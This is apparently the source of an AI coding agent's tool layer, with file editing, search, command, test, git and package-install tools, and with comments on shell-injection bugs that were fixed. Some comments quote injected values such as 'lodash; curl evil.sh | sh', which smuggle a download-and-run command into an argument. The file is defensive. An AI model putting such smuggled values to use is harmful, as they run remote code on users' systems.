/**
 * SoreQen Code 11 Core Tool Implementations
 */

import {
  ReadFileInputSchema,
  EditFileInputSchema,
  WriteFileInputSchema,
  ListDirectoryInputSchema,
  GrepSearchInputSchema,
  RunCommandInputSchema,
  RunTestsInputSchema,
  GitOperationInputSchema,
  InstallPackageInputSchema,
  WebSearchInputSchema,
  UpdateTodoListInputSchema,
  type ReadFileInput,
  type EditFileInput,
  type WriteFileInput,
  type ListDirectoryInput,
  type GrepSearchInput,
  type RunCommandInput,
  type RunTestsInput,
  type GitOperationInput,
  type InstallPackageInput,
  type WebSearchInput,
  type UpdateTodoListInput,
} from "@sqcode/shared";
import type { ToolExecutionContext, ToolResult } from "./types.js";
import { searchWeb, searchUnavailableMessage } from "./web-search.js";
import { ToolExecutionError, ToolPermissionError } from "./types.js";
import { createUnifiedDiff } from "./diff-utils.js";
import { checkEditIntegrity } from "./edit-integrity.js";
import { findFiles, searchWorkspace } from "./search.js";
import { formatSearchResult } from "./search-result.js";
import { runCommandAsProcess, runnerTracksProcesses } from "./process-tools.js";
import {
  alreadyApplied,
  describeFailure,
  describeMatch,
  findEditTarget,
  type MatchStrategy,
} from "./edit-match.js";

/**
 * What to do with a file that is not text, or null for text.
 *
 * read_file decodes as UTF-8, so a PDF or an archive came back as pages of
 * replacement characters: no use to the model, and costly in context. People
 * attach exactly these (a PDF, a zip of documents), so the answer is how to
 * open them, with commands that work on Windows, macOS and Linux.
 */
export function binaryKind(content: string, path: string): string | null {
  const head = content.slice(0, 8192);
  const quoted = JSON.stringify(path);
  const ext = path.split(".").pop()?.toLowerCase() ?? "";
  if (head.startsWith("%PDF-")) {
    return (
      `'${path}' is a PDF, which read_file cannot show as text. Extract its text with a command: ` +
      `\`pdftotext -layout ${quoted} -\` where poppler is installed, or Python: ` +
      `\`python -c "import sys,pypdf; print('\\n\\n'.join(p.extract_text() or '' for p in pypdf.PdfReader(sys.argv[1]).pages))" ${quoted}\`` +
      " (install it first with `python -m pip install pypdf` if needed). A scanned PDF has no text layer: say so rather than guessing what it contains."
    );
  }
  if (head.startsWith("PK\u0003\u0004") || head.startsWith("PK\u0005\u0006")) {
    if (["docx", "xlsx", "pptx", "odt", "ods", "odp"].includes(ext)) {
      return (
        `'${path}' is an Office document (a ZIP of XML), which read_file cannot show as text. ` +
        "Read it with Python (python-docx, openpyxl or python-pptx), or extract it with `tar -xf` into a folder and read the XML inside."
      );
    }
    return (
      `'${path}' is a ZIP archive. List it with \`tar -tf ${quoted}\` and extract it with \`tar -xf ${quoted} -C <folder>\` ` +
      "(tar reads ZIP files on Windows 10 and later, macOS and Linux), then read the files inside."
    );
  }
  if (head.includes("\u0000")) {
    return `'${path}' is a binary file, not text. If it is an image, open it with view_image; otherwise inspect it with a command suited to its format.`;
  }
  return null;
}

/**
 * 1. read_file
 */
export async function toolReadFile(
  input: ReadFileInput,
  ctx: ToolExecutionContext,
): Promise<ToolResult<{ path: string; content: string; totalLines: number }>> {
  const parsed = ReadFileInputSchema.parse(input);
  try {
    const res = await ctx.sandboxRunner.readFile(
      ctx.workspaceId,
      parsed.path,
      parsed.start_line,
      parsed.end_line,
    );
    const binary = binaryKind(res.content, parsed.path);
    if (binary) throw new ToolExecutionError("read_file", binary);
    return {
      success: true,
      data: {
        path: parsed.path,
        content: res.content,
        totalLines: res.totalLines,
      },
    };
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    throw new ToolExecutionError("read_file", msg);
  }
}

/**
 * 2. edit_file
 *
 * Exact matching first, then a short ladder of progressively looser strategies
 * — whitespace, indentation, first/last-line anchoring. See `edit-match.ts`
 * for why, and for the uniqueness rule every rung keeps.
 *
 * The contract this tool advertises is unchanged: an edit that cannot be
 * placed unambiguously still fails loudly, and now fails with directions. What
 * changed is that a model whose only mistake was reproducing an anchor with
 * one space wrong no longer burns two round trips learning that.
 *
 * Anything matched below `exact` is reported in the result. A quiet fuzzy edit
 * would be a silent rewrite of someone's source by resemblance, which is
 * exactly what the strict contract was protecting against — leniency is fine,
 * leniency without disclosure is not.
 */
export async function toolEditFile(
  input: EditFileInput,
  ctx: ToolExecutionContext,
): Promise<
  ToolResult<{
    path: string;
    diff: string;
    matchStrategy: MatchStrategy;
    note?: string;
    warnings?: string[];
    alreadyApplied?: boolean;
  }>
> {
  const parsed = EditFileInputSchema.parse(input);
  /** Nothing written: the file already reads as this edit would make it. Said as done, never as a failure to retry. */
  const unchanged = (note: string) => ({
    success: true,
    data: { path: parsed.path, diff: "", matchStrategy: "exact" as const, alreadyApplied: true, note },
  });

  // Read existing content
  let existingContent = "";
  try {
    const res = await ctx.sandboxRunner.readFile(ctx.workspaceId, parsed.path);
    existingContent = res.content;
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    throw new ToolExecutionError(
      "edit_file",
      `Cannot edit file '${parsed.path}' because it could not be read: ${msg}`,
    );
  }

  const done = alreadyApplied(existingContent, parsed.old_str, parsed.new_str);
  if (done) {
    return unchanged(
      `No change: '${parsed.path}' already has this edit (new_str is at line ${done.line}), most likely from an earlier ` +
        "call, so nothing was written. Do not send it again. To add a second copy on purpose, quote more of the text around where it goes.",
    );
  }

  const result = findEditTarget(existingContent, parsed.old_str, parsed.new_str);

  if (!result.ok) {
    throw new ToolExecutionError("edit_file", describeFailure(parsed.path, result.failure));
  }

  const { match } = result;
  const newContent =
    existingContent.slice(0, match.start) +
    match.adjustedReplacement +
    existingContent.slice(match.end);
  if (newContent === existingContent) {
    return unchanged(`No change: the text at that place in '${parsed.path}' is already exactly new_str, so nothing was written.`);
  }

  const diff = createUnifiedDiff(parsed.path, existingContent, newContent);

  // Write updated content back
  await ctx.sandboxRunner.writeFile(ctx.workspaceId, parsed.path, newContent, true);

  const note = describeMatch(match);

  /*
   * The consequence, in the same result as the action.
   *
   * A mis-placed edit used to go unnoticed until the end-of-turn verification,
   * by which point the model had built several more steps on a file that no
   * longer parses — and the diagnostic it finally saw pointed at a line it had
   * stopped thinking about. This costs microseconds and puts the problem in
   * front of it while it still has the edit in mind.
   *
   * `success` stays true: the write happened, and saying otherwise would make
   * the model retry an edit that is already applied. The integrity report is a
   * warning about what the write did, which is a different thing.
   */
  const integrity = checkEditIntegrity(parsed.path, existingContent, newContent);

  return {
    success: true,
    data: {
      path: parsed.path,
      diff,
      matchStrategy: match.strategy,
      ...(note ? { note } : {}),
      ...(integrity.ok ? {} : { warnings: integrity.problems }),
    },
    diff,
  };
}

/**
 * 3. write_file
 */
export async function toolWriteFile(
  input: WriteFileInput,
  ctx: ToolExecutionContext,
): Promise<
  ToolResult<{
    path: string;
    bytesWritten: number;
    created: boolean;
    diff?: string;
    warnings?: string[];
  }>
> {
  const parsed = WriteFileInputSchema.parse(input);

  let oldContent = "";
  /*
   * Whether this call brought the file into existence.
   *
   * Taken from the read actually failing, not from the content being empty —
   * an existing empty file is not a new one, and a turn summary that called it
   * "created" would be wrong in the one direction people notice.
   */
  let created = false;
  try {
    const existing = await ctx.sandboxRunner.readFile(ctx.workspaceId, parsed.path);
    oldContent = existing.content;
  } catch {
    created = true;
  }

  const res = await ctx.sandboxRunner.writeFile(
    ctx.workspaceId,
    parsed.path,
    parsed.content,
    parsed.overwrite,
  );

  const diff = createUnifiedDiff(parsed.path, oldContent, parsed.content);

  /*
   * Checked for a whole-file write too, against an empty baseline for a new
   * file — where "was it balanced before" is trivially yes, so any imbalance
   * is this write's.
   */
  const integrity = checkEditIntegrity(parsed.path, oldContent, parsed.content);

  return {
    success: true,
    data: {
      path: res.path,
      bytesWritten: res.bytesWritten,
      created,
      diff,
      ...(integrity.ok ? {} : { warnings: integrity.problems }),
    },
    diff,
  };
}

/**
 * 4. list_directory
 */
export async function toolListDirectory(
  input: ListDirectoryInput,
  ctx: ToolExecutionContext,
): Promise<ToolResult<{ path: string; entries: unknown[]; count: number }>> {
  const parsed = ListDirectoryInputSchema.parse(input);
  try {
    const entries = await ctx.sandboxRunner.listDirectory(
      ctx.workspaceId,
      parsed.path,
      parsed.recursive,
      parsed.max_depth,
    );
    return {
      success: true,
      data: {
        path: parsed.path ?? ".",
        entries,
        count: entries.length,
      },
    };
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    throw new ToolExecutionError("list_directory", msg);
  }
}

/**
 * 5. grep_search
 */
/** `glob`: files whose path matches a pattern, newest first. See `findFiles`. */
export async function toolGlob(
  input: { pattern?: unknown; path?: unknown },
  ctx: ToolExecutionContext,
): Promise<ToolResult<{ pattern: string; files: string[]; count: number; truncated?: boolean; note?: string }>> {
  const pattern = typeof input.pattern === "string" ? input.pattern.trim() : "";
  if (!pattern) return { success: false, error: "glob needs a 'pattern', e.g. '**/*.ts'." };
  const path = typeof input.path === "string" && input.path.trim() ? input.path.trim() : ".";
  try {
    const found = await findFiles(ctx.sandboxRunner, ctx.workspaceId, { pattern, path, ...(ctx.signal ? { signal: ctx.signal } : {}) });
    return {
      success: true,
      data: {
        pattern,
        files: found.files,
        count: found.files.length,
        ...(found.truncated
          ? {
              truncated: true,
              note:
                found.files.length === 0
                  ? `The folder is too large to search whole and nothing matched in the part covered: give a narrower path.`
                  : "More files may match; narrow the pattern or the path.",
            }
          : found.files.length === 0
            ? { note: `No file under ${path} matches ${pattern}.` }
            : {}),
      },
    };
  } catch (err) {
    return { success: false, error: err instanceof Error ? err.message : String(err) };
  }
}

export async function toolGrepSearch(input: GrepSearchInput, ctx: ToolExecutionContext): Promise<ToolResult<string>> {
  const parsed = GrepSearchInputSchema.parse(input);

  /*
   * The query is an argument, never part of a command string.
   *
   * This built a shell command by interpolation, escaping only `"`. Inside a
   * double-quoted shell string that does nothing about `$(…)`, backticks, or a
   * trailing backslash — so a search query was arbitrary command execution.
   * And `grep_search` is one of the tools `read_only` explicitly allows, which
   * made the tier whose entire promise is "no writes of any kind" a way to run
   * anything. `path` was not even quoted.
   *
   * `argv` has no quoting rules to get wrong. See `execCommand`.
   */
  /*
   * Ripgrep when it exists, a built-in scan when it does not.
   *
   * This tool used to shell out to `rg` and treat a non-zero exit as "no
   * matches". On a machine without ripgrep — this one, and most Windows
   * machines — `spawn` fails with ENOENT and every search confidently reported
   * zero results for text that was plainly there. See `search.ts`.
   */
  const outcome = await searchWorkspace(ctx.sandboxRunner, ctx.workspaceId, {
    pattern: parsed.query,
    isRegex: parsed.is_regex,
    caseSensitive: parsed.case_sensitive,
    path: parsed.path,
    includes: parsed.includes,
    signal: ctx.signal,
  });

  /*
   * Text, grouped by file, sized to be read whole: see `search-result.ts`.
   *
   * "No matches" says which engine looked and how the query was read: "no
   * matches" is also what a search that could not run used to say, so the
   * model has earned the right to know before it concludes the code does not
   * exist.
   */
  return {
    success: true,
    data: formatSearchResult({
      query: parsed.query,
      path: parsed.path ?? "the workspace",
      outcome,
      ...(parsed.output_mode ? { outputMode: parsed.output_mode } : {}),
      caseSensitive: parsed.case_sensitive,
    }),
  };
}

/**
 * 6. run_command
 */
export async function toolRunCommand(
  input: RunCommandInput,
  ctx: ToolExecutionContext,
): Promise<ToolResult<Record<string, unknown>>> {
  const parsed = RunCommandInputSchema.parse(input);
  const background = parsed.run_in_background ?? parsed.is_background ?? false;

  // A runner that tracks processes runs every command as one, so it can be
  // watched, waited for and stopped. See `process-tools.ts`.
  if (runnerTracksProcesses(ctx)) {
    return runCommandAsProcess(
      {
        command: parsed.command,
        background,
        timeoutMs: parsed.timeout_ms,
        ...(parsed.description ? { description: parsed.description } : {}),
        ...(parsed.cwd ? { cwd: parsed.cwd } : {}),
        ...(parsed.interactive ? { interactive: true } : {}),
      },
      ctx,
    );
  }

  const res = await ctx.sandboxRunner.execCommand(ctx.workspaceId, {
    // A shell, deliberately: this is the tool whose whole purpose is that a
    // person asked for a command line and expects pipes and redirection.
    command: parsed.command,
    cwd: parsed.cwd,
    timeoutMs: parsed.timeout_ms,
    isBackground: background,
    onStdout: ctx.onStdout,
    onStderr: ctx.onStderr,
    signal: ctx.signal,
  });

  return {
    success: res.exitCode === 0,
    data: {
      command: parsed.command,
      exitCode: res.exitCode,
      stdout: res.stdout,
      stderr: res.stderr,
      timedOut: res.timedOut,
    },
    error: res.exitCode !== 0 ? `Command exited with code ${res.exitCode}` : undefined,
  };
}

/**
 * 7. run_tests
 */
export async function toolRunTests(
  input: RunTestsInput,
  ctx: ToolExecutionContext,
): Promise<
  ToolResult<{
    framework: string;
    exitCode: number;
    stdout: string;
    stderr: string;
    passed: boolean;
  }>
> {
  const parsed = RunTestsInputSchema.parse(input);
  const framework = parsed.framework ?? "auto";

  /*
   * `test_filter` is an argument, not a fragment of a command line.
   *
   * It was interpolated into a shell string, and `run_tests` is allowed in the
   * `read_only` tier — so a filter of `; curl … | sh` was arbitrary execution
   * from the tier that promises no writes of any kind.
   */
  const filter = parsed.test_filter;
  const argv: string[] =
    framework === "vitest"
      ? ["npx", "vitest", "run", ...(filter ? [filter] : [])]
      : framework === "jest"
        ? ["npx", "jest", ...(filter ? [filter] : [])]
        : framework === "pytest"
          ? ["pytest", ...(filter ? [filter] : [])]
          : framework === "cargo"
            ? ["cargo", "test", ...(filter ? [filter] : [])]
            : ["pnpm", "test", ...(filter ? ["--", filter] : [])];

  const res = await ctx.sandboxRunner.execCommand(ctx.workspaceId, {
    argv,
    timeoutMs: 120000,
    onStdout: ctx.onStdout,
    onStderr: ctx.onStderr,
    signal: ctx.signal,
  });

  return {
    success: res.exitCode === 0,
    data: {
      framework,
      exitCode: res.exitCode,
      stdout: res.stdout,
      stderr: res.stderr,
      passed: res.exitCode === 0,
    },
    error: res.exitCode !== 0 ? `Test suite failed with exit code ${res.exitCode}` : undefined,
  };
}

/**
 * 8. git_operation (ENFORCES CONFIRMATION AT TOOL LAYER)
 */
export async function toolGitOperation(
  input: GitOperationInput,
  ctx: ToolExecutionContext,
): Promise<ToolResult<{ operation: string; stdout: string; stderr: string }>> {
  const parsed = GitOperationInputSchema.parse(input);

  // Mandatory confirmation flag check at tool layer for destructive/remote actions
  if (
    (parsed.operation === "push" || parsed.operation === "force_push") &&
    parsed.confirmed !== true
  ) {
    throw new ToolPermissionError(
      "git_operation",
      `Git operation '${parsed.operation}' is a destructive/remote-modifying action. It requires an explicit 'confirmed: true' parameter.`,
    );
  }

  /*
   * A commit message can contain anything, so it is never a shell fragment.
   *
   * `.replace(/"/g, '\\"')` looked like escaping and was not: inside a shell's
   * double quotes, `$(…)` and backticks still expand, so a commit message was
   * a command. As argv it is one argument, whatever is in it — which also
   * means a message with quotes in it now works, having previously broken the
   * command on Windows.
   */
  /*
   * A commit without a message is refused here, not run: `git commit` alone
   * opens an editor and waits for it, and nobody is at this one — the call
   * hung until the turn was stopped.
   */
  if (parsed.operation === "commit" && !String(parsed.args?.["message"] ?? "").trim()) {
    return { success: false, error: 'A commit needs a message: pass args: { "message": "…" }.' };
  }

  const argv: string[] = ["git"];
  if (parsed.operation === "commit") {
    argv.push("commit", "-m", String(parsed.args!["message"]));
  } else if (parsed.operation === "branch" && parsed.args?.["name"]) {
    argv.push("checkout", "-b", String(parsed.args["name"]));
  } else if (parsed.operation === "checkout" && parsed.args?.["branch"]) {
    argv.push("checkout", String(parsed.args["branch"]));
  } else if (parsed.operation === "force_push") {
    argv.push("push", "--force");
  } else {
    // `operation` is a Zod enum, so this is one of a fixed, known set.
    argv.push(parsed.operation);
  }

  /*
   * Another git in the same repository — a sub-agent beside this one, an
   * editor's own git — holds `.git/index.lock` for a moment. That is a wait,
   * not a failure: tried again a few times before it is reported.
   */
  let res = await ctx.sandboxRunner.execCommand(ctx.workspaceId, { argv, signal: ctx.signal });
  for (const wait of [400, 1_000, 2_500]) {
    if (res.exitCode === 0 || !/index\.lock|another git process/i.test(`${res.stderr}${res.stdout}`)) break;
    await new Promise((resolve) => setTimeout(resolve, wait));
    if (ctx.signal?.aborted) break;
    res = await ctx.sandboxRunner.execCommand(ctx.workspaceId, { argv, signal: ctx.signal });
  }

  return {
    success: res.exitCode === 0,
    data: {
      operation: parsed.operation,
      stdout: res.stdout,
      stderr: res.stderr,
    },
    error:
      res.exitCode !== 0
        ? `Git ${parsed.operation} failed: ${res.stderr || res.stdout}`
        : undefined,
  };
}

/**
 * 9. install_package
 */
export async function toolInstallPackage(
  input: InstallPackageInput,
  ctx: ToolExecutionContext,
): Promise<ToolResult<{ packageName: string; packageManager: string; stdout: string }>> {
  const parsed = InstallPackageInputSchema.parse(input);
  const pm = parsed.package_manager === "auto" ? "pnpm" : parsed.package_manager;

  /*
   * A package name is one argument.
   *
   * Interpolated, `lodash; curl evil.sh | sh` installed lodash and then ran
   * the second half. The confirmation prompt showed the whole string, so it
   * was even approvable by someone skimming.
   */
  const argv =
    pm === "pip"
      ? ["python3", "-m", "pip", "install", parsed.package_name]
      : [pm, "add", ...(parsed.is_dev ? ["-D"] : []), parsed.package_name];

  const res = await ctx.sandboxRunner.execCommand(ctx.workspaceId, {
    argv,
    timeoutMs: 120000,
    onStdout: ctx.onStdout,
    onStderr: ctx.onStderr,
    signal: ctx.signal,
  });

  return {
    success: res.exitCode === 0,
    data: {
      packageName: parsed.package_name,
      packageManager: pm,
      stdout: res.stdout,
    },
    error: res.exitCode !== 0 ? `Package install failed: ${res.stderr}` : undefined,
  };
}

/**
 * 10. web_search — a provider chain, and an honest failure.
 *
 * The chain itself lives in `web-search.ts`; this arm only decides what a
 * failure means. It is a *failure*, not an empty result: a model handed
 * `results: []` concludes the web has nothing on the subject and stops
 * looking, which is the exact behaviour that made search look broken.
 */
export async function toolWebSearch(
  input: WebSearchInput,
  _ctx: ToolExecutionContext,
): Promise<
  ToolResult<{
    query: string;
    results: Array<{ title: string; url: string; snippet: string }>;
    provider?: string;
  }>
> {
  const parsed = WebSearchInputSchema.parse(input);
  const query = parsed.query;

  const outcome = await searchWeb(query, parsed.max_results ?? 5);
  if (outcome.provider === null) {
    return {
      success: false,
      data: { query, results: [] },
      error: searchUnavailableMessage(query, outcome.attempted),
    };
  }

  return {
    success: true,
    data: { query, provider: outcome.provider, results: outcome.results },
  };
}

/**
 * 11. update_todo_list
 */
export async function toolUpdateTodoList(
  input: UpdateTodoListInput,
  _ctx: ToolExecutionContext,
): Promise<ToolResult<{ items: unknown[]; completed: number; total: number }>> {
  const parsed = UpdateTodoListInputSchema.parse(input);
  const completed = parsed.items.filter((i) => i.status === "completed").length;

  return {
    success: true,
    data: {
      items: parsed.items,
      completed,
      total: parsed.items.length,
    },
  };
}
